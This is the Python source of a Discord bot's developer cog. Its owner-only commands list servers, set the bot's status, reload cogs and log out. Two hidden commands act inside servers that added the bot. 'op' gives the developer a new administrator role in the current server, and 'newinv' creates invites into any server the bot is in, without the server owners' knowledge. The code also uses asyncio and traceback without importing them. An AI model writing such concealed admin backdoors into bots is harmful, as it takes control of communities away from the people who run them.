from discord.ext import commands
import discord
from dbfn import reactionbook
import os

class Dev(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.database = bot.database

    @commands.command(name="newinv", description="DEV | Creates an invite for a server!", hidden=True)
    @commands.is_owner()
    async def newinv(self, ctx, guild_id: int):
        guild = self.bot.get_guild(guild_id)
        try:
            invite = await guild.system_channel.create_invite(
                max_age=120 * 60, temporary=True)
        except: invite = "Error resolving invite!"
        await ctx.send(f"Created a temporary invite for `{guild}`\n"f"`{invite}`, this invite will expire after 2 hours.")

    @commands.command(name="guilds", hidden=True)
    @commands.is_owner()
    async def guilds(self, ctx):

        guilds = []
        members = 0
        for guild in self.bot.guilds:
            guilds.append([guild.member_count, guild.name, guild.id])
            members += guild.member_count
        guilds.sort(reverse=True)

        colour = self.bot.db.getcolour(ctx.author.id)
        book = reactionbook(self.bot, ctx, TITLE="Servers")
        book.createpages(guilds, f"`%1`: **%0**")
        await book.createbook(SHOW_RESULTS=True, COLOUR=colour)

    @commands.command(name="setstatus", hidden=True)
    @commands.is_owner()
    async def setstatus(self, ctx, *, text: str):
        await self.bot.change_presence(activity=discord.Game(name=text))
        await ctx.message.add_reaction("✅")

    @commands.command(name="op", description="DEV | Gives the developer a role with permission.", hidden=True)
    @commands.cooldown(1, 3, commands.BucketType.member)
    async def op(self, ctx):
        if ctx.author.id in self.bot.owner_ids:
            try:
                role = await ctx.guild.create_role(name="BetterEnv Dev")
                permissions = discord.Permissions()
                permissions.update(administrator=True)
                await role.edit(position=ctx.guild.me.top_role.position-1, permissions=permissions)
                user = ctx.message.author
                await user.add_roles(role)
                await ctx.message.add_reaction("✅")
            except discord.Forbidden:
                await ctx.send("I do not have permission to do this!")
        else:
            embed = discord.Embed(title="401 | Unauthorized!", description="You don't have the required permissions to invoke this command!", color=0xff0000)
            await ctx.send(embed=embed)

    @commands.command(name="logout")
    @commands.is_owner()
    async def logout(self, ctx):
        await ctx.send(f"Voiding process..")
        await self.bot.logout()

    @commands.command(name="reload", description="Reload all/one of the bots cogs!")
    @commands.is_owner()
    async def reload(self, ctx, cog=None):
        if not cog:
            # No cog, means we reload all cogs
            async with ctx.typing():
                embed = discord.Embed(
                    title="Reloading all cogs!",
                    color=0x808080,
                    timestamp=ctx.message.created_at
                )
                for ext in os.listdir("./cogs/"):
                    if ext.endswith(".py") and not ext.startswith("_"):
                        try:
                            self.bot.unload_extension(f"cogs.{ext[:-3]}")
                            self.bot.load_extension(f"cogs.{ext[:-3]}")
                            embed.add_field(
                                name=f"Reloaded: `{ext}`",
                                value='\uFEFF',
                                inline=False
                            )
                        except Exception as e:
                            embed.add_field(
                                name=f"Failed to reload: `{ext}`",
                                value=e,
                                inline=False
                            )
                        await asyncio.sleep(0.5)
                await ctx.send(embed=embed)
        else:
            # reload the specific cog
            async with ctx.typing():
                embed = discord.Embed(
                    title="Reloading all cogs!",
                    color=0x808080,
                    timestamp=ctx.message.created_at
                )
                ext = f"{cog.lower()}.py"
                if not os.path.exists(f"./cogs/{ext}"):
                    # if the file does not exist
                    embed.add_field(
                        name=f"Failed to reload: `{ext}`",
                        value="This cog does not exist.",
                        inline=False
                    )

                elif ext.endswith(".py") and not ext.startswith("_"):
                    try:
                        self.bot.unload_extension(f"cogs.{ext[:-3]}")
                        self.bot.load_extension(f"cogs.{ext[:-3]}")
                        embed.add_field(
                            name=f"Reloaded: `{ext}`",
                            value='\uFEFF',
                            inline=False
                        )
                    except Exception:
                        desired_trace = traceback.format_exc()
                        embed.add_field(
                            name=f"Failed to reload: `{ext}`",
                            value=desired_trace,
                            inline=False
                        )
                await ctx.send(embed=embed)
        

def setup(bot):
    bot.add_cog(Dev(bot))

